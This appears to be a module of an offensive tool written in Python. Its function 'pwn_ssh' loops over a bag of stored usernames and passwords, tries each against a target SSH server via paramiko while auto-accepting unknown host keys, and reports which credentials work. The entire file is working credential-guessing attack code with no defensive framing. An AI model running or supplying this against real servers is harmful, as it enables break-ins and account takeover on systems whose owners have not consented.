from typing import Tuple

import paramiko

from .credentials import credential_bag


def _get_ssh_client():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return ssh


def pwn_ssh(url: str, port: int, service) -> Tuple[str, bool, bool]:
    ssh = _get_ssh_client()

    working = set()
    for credential in credential_bag.credentials():
        try:
            ssh.connect(url, port=port, username=credential.username, password=credential)
            credential.mark_works(service)
            working.add(credential)
        except:
            credential.mark_rejected(service)
            continue

    if working:
        return "Found credentials: {}".format(working), True, False
    else:
        return 'Authentication failed', False, False


PWN_FUNCS = {
    'ssh': pwn_ssh,
}
